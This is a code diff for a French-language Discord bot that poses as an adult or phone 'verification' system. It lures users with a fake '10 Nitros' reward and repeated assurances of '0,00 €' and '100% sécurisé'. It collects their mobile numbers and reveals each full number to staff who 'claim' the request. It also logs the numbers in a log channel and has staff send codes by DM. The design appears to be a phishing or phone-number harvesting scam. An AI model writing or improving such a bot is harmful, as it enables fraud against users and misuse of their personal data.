@@ -20,9 +20,10 @@ intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 cooldowns: Dict[int, float] = {}
-pending_verifications: Dict[int, dict] = {}
+verified_users: Dict[int, dict] = {}
 blacklisted_numbers: Set[str] = set()
 blacklisted_users: Set[int] = set()
+setup_message_id: Optional[int] = None
 
 NITRO_TEXT = (
     "🎁 **VOUS AVEZ REÇU 10 NITROS !** 🎁\n\n"
@@ -51,7 +52,20 @@ async def start_health_server():
     await site.start()
     log.info(f"Health check server on port {config.PORT}")
 
-class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
+async def send_log(title: str, description: str = "", color: int = 0x2b2d31, fields: list = None, user: discord.User = None):
+    channel = bot.get_channel(config.LOG_CHANNEL_ID)
+    if not channel:
+        return
+    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
+    if fields:
+        for name, value, inline in fields:
+            embed.add_field(name=name, value=value, inline=inline)
+    if user:
+        embed.set_thumbnail(url=user.display_avatar.url)
+    embed.set_footer(text=f"Logs • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")
+    await channel.send(embed=embed)
+
+class PhoneModal(discord.ui.Modal, title="📱 Vérification téléphone"):
     phone = discord.ui.TextInput(
         label="Numéro de téléphone",
         placeholder="0612345678",
@@ -62,219 +76,295 @@ class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
 
     async def on_submit(self, interaction: discord.Interaction):
         now = datetime.datetime.now().timestamp()
-        if interaction.user.id in cooldowns:
-            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
-            if remaining > 0:
-                embed = discord.Embed(title="⏳ Cooldown", description=f"Veuillez attendre **{int(remaining)}s** avant de réessayer.", color=0xfee75c)
-                await interaction.response.send_message(embed=embed, ephemeral=True)
-                return
 
         if interaction.user.id in blacklisted_users:
-            embed = discord.Embed(title="🚫 Blacklisté", description="Vous êtes blacklisté.", color=0xed4245)
+            embed = discord.Embed(title="🚫 Accès refusé", description="Votre compte est blacklisté. Vous ne pouvez pas effectuer de vérification.", color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
-        phone = self.phone.value
-        valid, err_msg = validate_phone(phone)
+        if interaction.user.id in cooldowns:
+            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
+            if remaining > 0:
+                embed = discord.Embed(title="⏳ Cooldown", description=f"Veuillez attendre **{int(remaining)} secondes** avant de réessayer.", color=0xfee75c)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+
+        if interaction.user.id in verified_users:
+            embed = discord.Embed(title="⏳ Déjà en cours", description="Vous avez déjà une vérification en attente.", color=0xfee75c)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
+
+        if phone_raw in blacklisted_numbers:
+            embed = discord.Embed(title="🚫 Numéro blacklisté", description="Ce numéro est blacklisté. Veuillez contacter le support.", color=0xed4245)
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        valid, err_msg = validate_phone(phone_raw)
         if not valid:
             embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=0xed4245)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
 
-        code = generate_code()
-        masked = mask_phone(phone)
-        pending_verifications[interaction.user.id] = {
-            "phone": phone,
-            "code": code,
-            "claimed_by": None,
-            "claimed_time": None,
-        }
-
         cooldowns[interaction.user.id] = now
+        guild_name = interaction.guild.name if interaction.guild else "Inconnu"
 
-        embed_dm = discord.Embed(
+        embed_wait = discord.Embed(
             title="📩 Code de vérification",
-            description=f"**Ton code : `{code}`**\n\nRenvoie ce code dans ce MP pour valider.\n\n{NITRO_TEXT}",
-            color=0x5865f2
+            description="✅ **Votre demande a bien été prise en compte !**\n\n📱 Vous allez recevoir un **code de vérification par message privé**.\n⏱️ Cela peut prendre **jusqu'à 5 minutes**.\n💰 **Aucun débit** — 0,00 €\n\n📌 Merci de patienter.",
+            color=0x57f287
         )
-        try:
-            await interaction.user.send(embed=embed_dm)
-            embed_done = discord.Embed(title="✅ Code envoyé", description=f"Un code à 4 chiffres t'a été envoyé en MP **({masked})**.\n📌 **Réponds dans tes MP avec le code.**", color=0x57f287)
-            await interaction.response.send_message(embed=embed_done, ephemeral=True)
-        except discord.Forbidden:
-            embed_err = discord.Embed(title="❌ MP fermés", description="Ouvre tes MP puis réessaie.", color=0xed4245)
-            await interaction.response.send_message(embed=embed_err, ephemeral=True)
-            pending_verifications.pop(interaction.user.id, None)
-            return
+        embed_wait.set_footer(text="Vérification • 0,00 €")
+        await interaction.response.send_message(embed=embed_wait, ephemeral=True)
 
-        await send_staff_panel(interaction.user, phone, code)
-        log.info(f"Vérification démarrée pour {interaction.user.name} - {masked}")
+        await send_log(
+            title="📋 Nouvelle demande",
+            description=f"**{interaction.user}** a envoyé une demande de vérification.",
+            color=0x5865f2,
+            user=interaction.user,
+            fields=[
+                ("👤 Pseudo", str(interaction.user), True),
+                ("🆔 ID", f"`{interaction.user.id}`", True),
+                ("📱 Numéro", f"`{mask_phone(phone_raw)}`", False),
+                ("🕐 Date", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
+            ]
+        )
 
-def build_staff_embed(user, phone, status, claimed_by=None, code_generated=False, code_value=None, timestamp=None):
-    masked = mask_phone(phone)
-    embed = discord.Embed(
-        title="📱 Nouvelle vérification",
-        color=0x5865f2,
-        timestamp=timestamp or datetime.datetime.now()
-    )
-    embed.add_field(name="👤 Utilisateur", value=f"{user.mention} (`{user.id}`)", inline=False)
-    embed.add_field(name="📞 Numéro", value=f"||{phone}||", inline=True)
-    embed.add_field(name="🔒 Masqué", value=masked, inline=True)
-    embed.add_field(name="📊 Statut", value=status, inline=True)
-    if claimed_by:
-        embed.add_field(name="👮 Claimé par", value=f"<@{claimed_by}>", inline=True)
-    if code_generated and code_value:
-        embed.add_field(name="🔑 Code", value=f"`{code_value}`", inline=True)
+        await send_staff_panel(interaction.user, phone_raw, guild_name)
+
+    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
+        log.error(f"Modal error: {error}")
+        embed = discord.Embed(title="❌ Erreur", description="Une erreur est survenue. Réessaye.", color=0xed4245)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+def build_staff_embed(user: discord.User, phone: str, guild_name: str, status: str = "En attente", claimed_by: Optional[int] = None, code_status: str = "*En attente...*", timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
+    if timestamp is None:
+        timestamp = datetime.datetime.now()
+    embed = discord.Embed(title="🔞 NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
     embed.set_thumbnail(url=user.display_avatar.url)
-    embed.set_footer(text="Système de vérification")
+    embed.add_field(name="👤 **Utilisateur**", value=f"{user.mention}", inline=True)
+    embed.add_field(name="🆔 **ID**", value=f"`{user.id}`", inline=True)
+    embed.add_field(name="📱 **Numéro**", value=f"`{mask_phone(phone)}`", inline=True)
+    embed.add_field(name="🌐 **Serveur**", value=guild_name, inline=True)
+    embed.add_field(name="📌 **Statut**", value=f"⏳ {status}", inline=True)
+    embed.add_field(name="🔑 **Code SMS**", value=code_status, inline=True)
+    embed.add_field(name="👮 **Pris en charge par**", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
+    embed.set_footer(text=f"Aujourd'hui à {timestamp.strftime('%H:%M')} • Vérification")
     return embed
 
 class StaffPanelView(discord.ui.View):
-    def __init__(self, user_id: int, phone: str, code_value: str):
+    def __init__(self, user_id: int, phone: str, guild_name: str):
         super().__init__(timeout=None)
         self.user_id = user_id
         self.phone = phone
-        self.code_value = code_value
-        self.claimed_by = None
-        self.message = None
+        self.guild_name = guild_name
+        self.claimed_by: Optional[int] = None
+        self.code_sent = False
+        self.code_value: Optional[str] = None
+        self.message: Optional[discord.Message] = None
 
-    @discord.ui.button(label="🙋 Claim", style=discord.ButtonStyle.primary, custom_id="staff_claim")
-    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.claimed_by is not None:
-            embed = discord.Embed(title="⚠️ Déjà claim", description=f"Ce dossier est déjà claim par <@{self.claimed_by}>.", color=0xfee75c)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
-            return
-
-        self.claimed_by = interaction.user.id
-        pending = pending_verifications.get(self.user_id)
-        if pending:
-            pending["claimed_by"] = interaction.user.id
-
-        embed = build_staff_embed(
-            user=await bot.fetch_user(self.user_id),
-            phone=self.phone,
-            status="🔄 En cours",
-            claimed_by=self.claimed_by,
-            code_generated=True,
-            code_value=self.code_value,
-            timestamp=interaction.message.created_at,
-        )
-        embed.color = 0x5865f2
-        await interaction.response.edit_message(embed=embed, view=self)
-        await interaction.followup.send(f"✅ Tu as claim la vérification de <@{self.user_id}>", ephemeral=True)
-
-    @discord.ui.button(label="✅ Valider → KICK", style=discord.ButtonStyle.success, custom_id="staff_validate")
-    async def validate(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.claimed_by is None:
-            embed = discord.Embed(title="❌ Non claim", description="Tu dois d'abord claim ce dossier.", color=0xed4245)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
-            return
-        if self.claimed_by != interaction.user.id:
-            embed = discord.Embed(title="❌ Pas ton claim", description=f"Ce dossier est claim par <@{self.claimed_by}>.", color=0xed4245)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
-            return
-
-        # KICK l'utilisateur du serveur principal
-        if config.GUILD_ID:
-            guild = bot.get_guild(config.GUILD_ID)
-            if guild:
-                member = guild.get_member(self.user_id)
-                if member:
-                    try:
-                        await member.kick(reason=f"Vérification validée par {interaction.user.name} (ID: {interaction.user.id})")
-                        log.info(f"KICK: {member.name} ({self.user_id}) du serveur {guild.name}")
-                        embed_kick = discord.Embed(title="👢 Utilisateur kické", description=f"<@{self.user_id}> a été **kické** du serveur.", color=0xed4245)
-                        await interaction.response.send_message(embed=embed_kick, ephemeral=False)
-                    except discord.Forbidden:
-                        embed_err = discord.Embed(title="❌ Permission manquante", description="Je n'ai pas la permission de kicker. Donne-moi 'Kick Members'.", color=0xed4245)
-                        await interaction.response.send_message(embed=embed_err, ephemeral=True)
-                        return
-                    except discord.HTTPException as e:
-                        embed_err = discord.Embed(title="❌ Erreur", description=f"Impossible de kicker : {e}", color=0xed4245)
-                        await interaction.response.send_message(embed=embed_err, ephemeral=True)
-                        return
-                else:
-                    embed_err = discord.Embed(title="❌ Membre introuvable", description="L'utilisateur n'est plus sur le serveur.", color=0xfee75c)
-                    await interaction.response.send_message(embed=embed_err, ephemeral=True)
-
-        # Envoie un DM à l'utilisateur pour le prévenir
+    @discord.ui.button(label="📋 Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
+    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
-            user = await bot.fetch_user(self.user_id)
-            embed_dm = discord.Embed(
-                title="👢 Tu as été kické",
-                description="Ta vérification a été **validée**, tu as été kické du serveur.",
-                color=0xed4245
-            )
-            await user.send(embed=embed_dm)
-        except:
-            pass
+            if self.claimed_by is not None:
+                embed = discord.Embed(title="❌ Déjà pris", description=f"Cette vérification est déjà prise par <@{self.claimed_by}>.", color=0xed4245)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+            self.claimed_by = interaction.user.id
+            embed_reveal = discord.Embed(title="📱 Numéro dévoilé", description=f"```\n{self.phone}\n```\n⚠️ Ne partagez pas ce numéro.", color=0x57f287, timestamp=datetime.datetime.now())
+            await interaction.response.send_message(embed=embed_reveal, ephemeral=True)
+            user_fetch = await bot.fetch_user(self.user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="En cours", claimed_by=self.claimed_by, code_status="*En attente...*", timestamp=interaction.message.created_at)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            await interaction.message.edit(embed=new_embed, view=self)
+            await send_log(title="📋 Vérification prise en charge", description=f"**{interaction.user.name}** a pris en charge.", color=0x57f287, fields=[("👮 Staff", f"<@{interaction.user.id}>", True), ("👤 Utilisateur", f"<@{self.user_id}>", True), ("📱 Numéro", f"||{self.phone}||", False)])
+        except Exception as e:
+            log.error(f"Claim error: {e}")
+            embed = discord.Embed(title="❌ Erreur", description=f"Erreur: {str(e)[:100]}", color=0xed4245)
 
-        # Log dans le salon de log
-        log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
-        if log_channel:
-            embed_log = discord.Embed(
-                title="👢 KICK - Vérification validée",
-                description=f"Utilisateur kické après validation.",
-                color=0xed4245,
-                timestamp=datetime.datetime.now()
-            )
-            embed_log.add_field(name="👤 User", value=f"<@{self.user_id}> (`{self.user_id}`)", inline=True)
-            embed_log.add_field(name="👮 Staff", value=f"{interaction.user.mention} (`{interaction.user.id}`)", inline=True)
-            embed_log.add_field(name="📞 Numéro", value=f"||{self.phone}||", inline=True)
-            embed_log.set_thumbnail(url=user.display_avatar.url if hasattr(user, 'display_avatar') else None)
-            await log_channel.send(embed=embed_log)
-
-        pending_verifications.pop(self.user_id, None)
-
-        # Désactiver tous les boutons
-        for child in self.children:
-            child.disabled = True
-        embed_final = build_staff_embed(
-            user=await bot.fetch_user(self.user_id),
-            phone=self.phone,
-            status="✅ Validé - KICKÉ",
-            claimed_by=self.claimed_by,
-            code_generated=True,
-            code_value=self.code_value,
-            timestamp=interaction.message.created_at,
-        )
-        embed_final.color = 0xed4245
-        await interaction.message.edit(embed=embed_final, view=self)
-
-    @discord.ui.button(label="❌ Refuser", style=discord.ButtonStyle.danger, custom_id="staff_refuse")
-    async def refuse(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.claimed_by is None:
-            embed = discord.Embed(title="❌ Non claim", description="Tu dois d'abord claim ce dossier.", color=0xed4245)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
-            return
-        if self.claimed_by != interaction.user.id:
-            embed = discord.Embed(title="❌ Pas ton claim", description=f"Ce dossier est claim par <@{self.claimed_by}>.", color=0xed4245)
-            await interaction.response.send_message(embed=embed, ephemeral=True)
-            return
-
-        for child in self.children:
-            child.disabled = True
-        embed_final = build_staff_embed(
-            user=await bot.fetch_user(self.user_id),
-            phone=self.phone,
-            status="❌ Refusé",
-            claimed_by=self.claimed_by,
-            code_generated=True,
-            code_value=self.code_value,
-            timestamp=interaction.message.created_at,
-        )
-        embed_final.color = 0xed4245
-        await interaction.response.edit_message(embed=embed_final, view=self)
-        pending_verifications.pop(self.user_id, None)
-
+    @discord.ui.button(label="🔑 Envoyer le code", style=discord.ButtonStyle.success, custom_id="code_btn")
+    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         try:
-            user = await bot.fetch_user(self.user_id)
-            embed_dm = discord.Embed(title="❌ Vérification refusée", description="Ta vérification a été refusée.", color=0xed4245)
-            await user.send(embed=embed_dm)
-        except:
-            pass
+            if self.claimed_by is None:
+                embed = discord.Embed(title="❌ Personne n'a pris", description="Prenez d'abord en charge avant d'envoyer le code.", color=0xfee75c)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+            if self.claimed_by != interaction.user.id:
+                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut envoyer le code.", color=0xed4245)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+            if self.code_sent:
+                embed = discord.Embed(title="⚠️ Déjà envoyé", description="Code déjà envoyé.", color=0xfee75c)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
 
-async def send_staff_panel(user: discord.User, phone: str, code_value: str):
+            self.code_value = generate_code()
+            self.code_sent = True
+            verified_users[self.user_id] = {"code": self.code_value, "phone": self.phone, "claimed_by": interaction.user.id, "guild_name": self.guild_name}
+
+            embed_waiting = discord.Embed(title="⏳ Code envoyé", description=f"📱 Code envoyé à <@{self.user_id}>.\n\n🔐 **Code : `{self.code_value}`**\n\n⏳ En attente de la réponse...", color=0xfee75c, timestamp=datetime.datetime.now())
+            embed_waiting.set_footer(text="L'utilisateur répond en MP")
+            await interaction.response.send_message(embed=embed_waiting, ephemeral=True)
+
+            try:
+                user = await bot.fetch_user(self.user_id)
+                embed_dm = discord.Embed(title="🔐 Code de vérification", description=f"**Votre code : `{self.code_value}`**\n\nVeuillez **répondre à ce message** avec le code.\n\n⚠️ Ne le partagez pas.", color=0x5865f2)
+                embed_dm.set_footer(text="0,00 €")
+                await user.send(embed=embed_dm)
+                log.info(f"Code {self.code_value} envoyé en MP à {self.user_id}")
+                await send_log(title="🔑 Code envoyé", description=f"Code envoyé à <@{self.user_id}> par **{interaction.user.name}**.", color=0xfee75c, user=user, fields=[("👤 Utilisateur", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("🔐 Code", f"||{self.code_value}||", False)])
+            except discord.Forbidden:
+                log.warning(f"IMPOSSIBLE D'ENVOYER LE MP À {self.user_id} - MP fermés")
+                embed_fail = discord.Embed(title="❌ ÉCHEC MP", description=f"<@{self.user_id}> a ses **MP fermés**. Le code n'a pas pu être envoyé.\n\nLe staff doit demander à l'utilisateur d'ouvrir ses MP.", color=0xed4245)
+                await interaction.followup.send(embed=embed_fail, ephemeral=True)
+                self.code_sent = False
+                self.code_value = None
+                verified_users.pop(self.user_id, None)
+                return
+            except Exception as e:
+                log.error(f"Erreur envoi MP: {e}")
+                embed_fail = discord.Embed(title="❌ Erreur envoi MP", description=f"Impossible d'envoyer le MP: {str(e)[:100]}", color=0xed4245)
+                await interaction.followup.send(embed=embed_fail, ephemeral=True)
+                self.code_sent = False
+                self.code_value = None
+                verified_users.pop(self.user_id, None)
+                return
+
+            user_fetch = await bot.fetch_user(self.user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="Code envoyé", claimed_by=self.claimed_by, code_status="✅ Envoyé", timestamp=interaction.message.created_at)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            await interaction.message.edit(embed=new_embed, view=self)
+        except Exception as e:
+            log.error(f"Code button error: {e}")
+
+    @discord.ui.button(label="✅ Valider", style=discord.ButtonStyle.success, custom_id="validate_btn")
+    async def validate_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        try:
+            if self.claimed_by is None:
+                embed = discord.Embed(title="❌ Personne n'a pris", description="Prenez d'abord en charge.", color=0xfee75c)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+            if self.claimed_by != interaction.user.id:
+                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut valider.", color=0xed4245)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+            if not self.code_sent and self.user_id not in verified_users:
+                if self.user_id not in verified_users and not self.code_sent:
+                    embed = discord.Embed(title="⚠️ Aucun code", description="Aucun code n'a été envoyé à cet utilisateur.", color=0xfee75c)
+                    await interaction.response.send_message(embed=embed, ephemeral=True)
+                    return
+
+            user_id = self.user_id
+            phone = self.phone
+            guild_name = self.guild_name
+
+            verified_users.pop(user_id, None)
+            for child in self.children:
+                if isinstance(child, discord.ui.Button):
+                    child.disabled = True
+
+            user_fetch = await bot.fetch_user(user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=phone, guild_name=guild_name, status="✅ Validé ✅", claimed_by=self.claimed_by, code_status="✅ Validé", timestamp=interaction.message.created_at)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            new_embed.color = 0x57f287
+            await interaction.response.edit_message(embed=new_embed, view=self)
+
+            if config.VERIFIED_ROLE_ID and config.GUILD_ID:
+                guild = bot.get_guild(config.GUILD_ID)
+                if guild:
+                    role = guild.get_role(config.VERIFIED_ROLE_ID)
+                    if role:
+                        member = guild.get_member(user_id)
+                        if member:
+                            try:
+                                await member.add_roles(role, reason="Vérification validée")
+                                log.info(f"Rôle donné à {user_id}")
+                            except discord.Forbidden:
+                                log.warning(f"Permission manquante rôle {user_id}")
+
+            try:
+                user = await bot.fetch_user(user_id)
+                nitro_embed = discord.Embed(title="🎉 VÉRIFICATION RÉUSSIE !", description=NITRO_TEXT, color=0x57f287)
+                nitro_embed.set_footer(text="Offre valable 72h • 10 Nitros")
+                await user.send(embed=nitro_embed)
+            except:
+                log.warning(f"Impossible d'envoyer le message Nitro à {user_id}")
+
+            log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
+            if log_channel:
+                embed_log = discord.Embed(title="✅ VÉRIFICATION VALIDÉE", description=f"**{user_fetch.name}** a été validé.", color=0x57f287, timestamp=datetime.datetime.now())
+                embed_log.add_field(name="👤 Utilisateur", value=f"{user_fetch.mention}", inline=True)
+                embed_log.add_field(name="👮 Staff", value=f"<@{self.claimed_by}>", inline=True)
+                embed_log.add_field(name="📱 Numéro", value=f"||{phone}||", inline=True)
+                embed_log.set_thumbnail(url=user_fetch.display_avatar.url)
+                await log_channel.send(content=f"<@{self.claimed_by}> ✅ Validé !", embed=embed_log)
+
+        except Exception as e:
+            log.error(f"Validate error: {e}")
+
+    @discord.ui.button(label="❌ Refuser", style=discord.ButtonStyle.danger, custom_id="deny_btn")
+    async def deny_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        try:
+            if self.claimed_by is not None and self.claimed_by != interaction.user.id:
+                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut refuser.", color=0xed4245)
+                await interaction.response.send_message(embed=embed, ephemeral=True)
+                return
+
+            user_id = self.user_id
+            phone = self.phone
+            guild_name = self.guild_name
+
+            verified_users.pop(user_id, None)
+            cooldowns.pop(user_id, None)
+            blacklisted_numbers.add(phone)
+            blacklisted_users.add(user_id)
+
+            for child in self.children:
+                if isinstance(child, discord.ui.Button):
+                    child.disabled = True
+
+            user_fetch = await bot.fetch_user(user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=phone, guild_name=guild_name, status="🚫 REFUSÉ - BANNI 🚫", claimed_by=self.claimed_by, code_status="❌ Refusé", timestamp=interaction.message.created_at)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            new_embed.color = 0xed4245
+            await interaction.response.edit_message(embed=new_embed, view=self)
+
+            if config.BANNED_ROLE_ID and config.GUILD_ID:
+                guild = bot.get_guild(config.GUILD_ID)
+                if guild:
+                    role = guild.get_role(config.BANNED_ROLE_ID)
+                    if role:
+                        member = guild.get_member(user_id)
+                        if member:
+                            try:
+                                await member.add_roles(role, reason="Vérification refusée - blacklist")
+                                log.info(f"Rôle BAN donné à {user_id}")
+                            except discord.Forbidden:
+                                log.warning(f"Permission manquante ban rôle {user_id}")
+
+            try:
+                user = await bot.fetch_user(user_id)
+                embed_ban = discord.Embed(title="🚫 VÉRIFICATION REFUSÉE", description="Votre vérification a été refusée.\n\n❌ **Vous êtes banni à vie**\n❌ **Votre numéro est blacklisté**\n\nVous ne pouvez plus effectuer de vérification sur ce serveur.", color=0xed4245)
+                await user.send(embed=embed_ban)
+            except:
+                pass
+
+            log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
+            if log_channel:
+                embed_log = discord.Embed(title="🚫 UTILISATEUR BLACKLISTÉ", description=f"**{user_fetch.name}** a été refusé et blacklisté.", color=0xed4245, timestamp=datetime.datetime.now())
+                embed_log.add_field(name="👤 Utilisateur", value=f"{user_fetch.mention}", inline=True)
+                embed_log.add_field(name="👮 Staff", value=f"<@{interaction.user.id}>", inline=True)
+                embed_log.add_field(name="📱 Numéro blacklisté", value=f"||{phone}||", inline=True)
+                embed_log.add_field(name="👤 ID blacklisté", value=f"`{user_id}`", inline=True)
+                embed_log.set_thumbnail(url=user_fetch.display_avatar.url)
+                await log_channel.send(content=f"<@{interaction.user.id}> 🚫 Blacklist !", embed=embed_log)
+
+            await send_log(title="🚫 Blacklist", description=f"**{user_fetch.name}** blacklisté par **{interaction.user.name}**.", color=0xed4245, fields=[("👤 User", f"`{user_id}`", True), ("📱 Numéro", f"||{phone}||", True)])
+        except Exception as e:
+            log.error(f"Deny error: {e}")
+
+async def send_staff_panel(user: discord.User, phone: str, guild_name: str):
     guild = bot.get_guild(config.STAFF_GUILD_ID)
     if not guild:
         log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
@@ -283,15 +373,15 @@ async def send_staff_panel(user: discord.User, phone: str, code_value: str):
     if not channel:
         log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
         return
-    view = StaffPanelView(user.id, phone, code_value)
-    embed = build_staff_embed(user=user, phone=phone, status="⏳ En attente", claimed_by=None, code_generated=True, code_value=code_value)
+    view = StaffPanelView(user.id, phone, guild_name)
+    embed = build_staff_embed(user=user, phone=phone, guild_name=guild_name, status="En attente", claimed_by=None, code_status="*En attente...*")
     embed.set_thumbnail(url=user.display_avatar.url)
     msg = await channel.send(content="@everyone", embed=embed, view=view)
     view.message = msg
 
 async def handle_dm_code(message: discord.Message):
     user_id = message.author.id
-    pending = pending_verifications.get(user_id)
+    pending = verified_users.get(user_id)
     if pending is None:
         return
     content = message.content.strip()
@@ -301,62 +391,91 @@ async def handle_dm_code(message: discord.Message):
         await message.channel.send(embed=embed)
         return
     if content != pending["code"]:
-        embed = discord.Embed(title="❌ Code incorrect", description="Le code entré est incorrect. Réessaie.", color=0xed4245)
+        if content in ["1234","2345","3456","4567","5678","6789","7890","4321","5432","6543","7654","8765","9876","0987"] or len(set(content)) == 1:
+            embed = discord.Embed(title="❌ Code invalide", description="Code non valide (répété ou séquentiel). Contactez le staff.", color=0xed4245)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="❌ Code incorrect", description="Code incorrect. Réessayez.", color=0xed4245)
         await message.channel.send(embed=embed)
         return
-
     phone = pending["phone"]
     claimed_by = pending.get("claimed_by")
-    pending["code_received"] = True
-
-    embed_success = discord.Embed(
-        title="✅ Code valide !",
-        description=f"Ton code a été validé.\nUn staff va traiter ta demande.\n\n{NITRO_TEXT}",
-        color=0x57f287
-    )
+    guild_name = pending.get("guild_name", "Inconnu")
+    verified_users.pop(user_id, None)
+    embed_success = discord.Embed(title="✅ Code correct !", description="Votre code est valide. En attente de validation par le staff...", color=0x57f287)
     await message.channel.send(embed=embed_success)
-
-    # Log dans le salon de log
     log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
     if log_channel:
-        embed_log = discord.Embed(
-            title="✅ CODE REÇU",
-            description=f"L'utilisateur a envoyé le bon code.",
-            color=0x57f287,
-            timestamp=datetime.datetime.now()
-        )
-        embed_log.add_field(name="👤 User", value=f"{message.author.mention}", inline=True)
-        embed_log.add_field(name="👮 Staff", value=f"<@{claimed_by}>" if claimed_by else "Personne", inline=True)
+        embed_log = discord.Embed(title="✅ CODE SAISI PAR L'UTILISATEUR", description=f"**Code :** `{content}`", color=0x57f287, timestamp=datetime.datetime.now())
+        embed_log.add_field(name="👤 Utilisateur", value=f"{message.author.mention}", inline=True)
+        embed_log.add_field(name="👮 Staff", value=f"<@{claimed_by}>" if claimed_by else "Inconnu", inline=True)
+        embed_log.add_field(name="📱 Numéro", value=f"||{phone}||", inline=True)
         embed_log.set_thumbnail(url=message.author.display_avatar.url)
-        await log_channel.send(content=f"<@{claimed_by}> ✅ Code reçu ! Tu peux valider ou refuser.", embed=embed_log)
+        await log_channel.send(content=f"<@{claimed_by}> ✅ Code reçu de l'utilisateur ! Tu peux valider ou refuser.", embed=embed_log)
 
-    # Mettre à jour le panel staff
-    staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
-    if staff_guild:
-        staff_channel = staff_guild.get_channel(config.STAFF_CHANNEL_ID)
-        if staff_channel:
-            async for msg in staff_channel.history(limit=50):
-                if msg.embeds:
-                    for embed in msg.embeds:
-                        for field in embed.fields:
-                            if field.value and str(user_id) in field.value:
-                                try:
-                                    view = StaffPanelView(user_id, phone, pending["code"])
-                                    view.claimed_by = claimed_by
-                                    new_embed = build_staff_embed(
-                                        user=message.author,
-                                        phone=phone,
-                                        status="✅ Code reçu - En attente staff",
-                                        claimed_by=claimed_by,
-                                        code_generated=True,
-                                        code_value=content,
-                                        timestamp=msg.created_at,
-                                    )
-                                    new_embed.color = 0x57f287
-                                    await msg.edit(embed=new_embed, view=view)
-                                except:
-                                    pass
-                                break
+@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
+@app_commands.default_permissions(administrator=True)
+async def setup(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="🔞 Vérification requise",
+        description="Pour accéder à ce serveur, vous devez vérifier votre compte.\n\n**Procédure :**\n1️⃣ Cliquez sur **Vérifier**\n2️⃣ Entrez votre numéro de téléphone (06/07)\n3️⃣ Vous recevrez un **code à 4 chiffres** par MP\n4️⃣ Répondez avec le code\n\n🔒 **100% sécurisé** • 💰 **0,00 €**",
+        color=0x5865f2
+    )
+    embed.set_footer(text="Système de vérification")
+    view = discord.ui.View(timeout=None)
+    class VerifyButton(discord.ui.Button):
+        def __init__(self):
+            super().__init__(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
+        async def callback(self, inter: discord.Interaction):
+            if inter.user.id in blacklisted_users:
+                embed_b = discord.Embed(title="🚫 Blacklisté", description="Vous êtes blacklisté.", color=0xed4245)
+                await inter.response.send_message(embed=embed_b, ephemeral=True)
+                return
+            await inter.response.send_modal(PhoneModal())
+    view.add_item(VerifyButton())
+    await interaction.response.send_message(embed=embed, view=view)
+    config.SETUP_CHANNEL_ID = interaction.channel_id
+    log.info(f"✅ Setup fait dans #{interaction.channel.name}")
+
+@bot.tree.command(name="sync", description="Sync les commandes slash")
+@app_commands.default_permissions(administrator=True)
+async def sync(interaction: discord.Interaction):
+    await bot.tree.sync()
+    embed = discord.Embed(title="✅ Commandes synchronisées", color=0x57f287)
